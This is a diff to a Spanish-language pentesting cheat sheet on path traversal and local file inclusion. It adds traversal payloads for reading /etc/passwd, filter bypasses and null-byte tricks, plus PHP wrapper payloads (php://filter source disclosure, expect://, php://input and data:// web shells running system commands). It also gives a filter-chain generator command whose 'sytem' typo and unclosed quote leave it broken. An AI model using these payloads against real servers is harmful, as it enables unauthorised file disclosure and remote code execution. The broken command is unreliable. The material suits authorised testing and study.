@@ -12,30 +12,77 @@
 
 #### Path traversal basics
 ```bash
+#basico
 ../../etc/passwd
+
+#cuando se omite el "../" en el código
 ....//....//etc/passwd
+
+# cuando prohibe el "../"
 ..////..////..../////etc/passwd
+
+# cuando prohibe un fichero concreto
+../etc///////passwd
+../etc/host?s
+../etc/passwd/.
+
+# cuando se concatena una extension .php al final por defecto, hacemos uso de null bytes (versiones antiguas de php por debajo de la 5.3)
+../etc/passwd%00
+../etc/passwd\0
+
 ```
 
-#### Path traversal PHP
-Cuando un fichero php en una web, contiene algún include para un fichero, por ejemplo:
-http://10.10.10.10/index.php?page= 
+### PHP Wrappers
 
-se puede intentar un path traversal justo ahí, detrás del igual.  El null byte final se utiliza para omitir la extensión, ya que en ocasiones se concatena la extensión en el codigo.
+#### Ver codigo php
+Cuando nos concatena al final la extension php, ejemplo tenemos: 
+http://ip/index.php?page=curso
+pero en realidad estamos accediendo a : http://ip/index.php?page=curso.php
 
-para que la web se vea así:
-http://10.10.10.10/index.php?page=curso
-en lugar de
-http://10.10.10.10/index.php?page=curso.php
-
+Se pueden utilizar wrappers, para evitar que nos interprete el código php y podriamos ver el contenido de un fichero wpconfig.php de wordpress:
 ```bash
-../../etc/passwd%00
+http://ip/index.php?page=php://filter/convert.base64-encode/resource=curso.php
 ```
-#### LFI en Grafana
-Con CURL. En alguna versión vulnerable de "Grafana", se puede ver ficheros de la máquina de la siguiente manera:
+
+Al ver el codigo fuente, vemos en alguna parte del codigo, un chorro de caracteres en base64 que podemos decodificar.
+
+#### Ejecutar codigo
+##### Metodo 1
 ```bash
-curl http://ip/../../../../../../../../etc/passwd --path-as-is -o fichero.extension
+http://ip/index.php?page=expect://whoami
 ```
+##### Metodo 2
+Interceptando petición por burpsuite, y cambiando el método a POST
+debemos meter el php://input,  algo así:
+```bash
+POST /?page=php://input HTTP/1.1
+
+# abajo de toda la cabecera
+<?php system("whoami"); ?>
+```
+
+##### Metodo 2 BIS
+De la misma manera por POST:
+```bash
+POST /?page=data://text/plain;base64,<comando en base64 Y URLENCODEADO> HTTP/1.1
+```
+
+Si metemos en base64 urlencodeado el tipico ```bash <?php system($_GET["cmd"]); ?>``` 
+
+y luego:
+```bash
+POST /?page=data://text/plain;base64, <el codigo anterior urlencodeado y en base64>&cmd=whoami
+```
+
+##### Con php filter chain generator
+Es un método bastante complejo pero que gracias a un script en python se puede automatizar.
+[php filter chain generator GITHUB](https://github.com/synacktiv/php_filter_chain_generator)
+```bash
+python3 php_filter_chain_generator.py --chain '<?php sytem($_GET["cmd"]); ?>
+```
+
+Esto genera una cadena de caracteres hiper larga, que debemos meter en la url: http://ip/index.php?page=<cadena>&cmd=whoami
+
 
 #### LFI to RCE
 Si detectamos un LFI y por casualidad podemos subir ficheros, podriamos subir un fichero malicioso en php
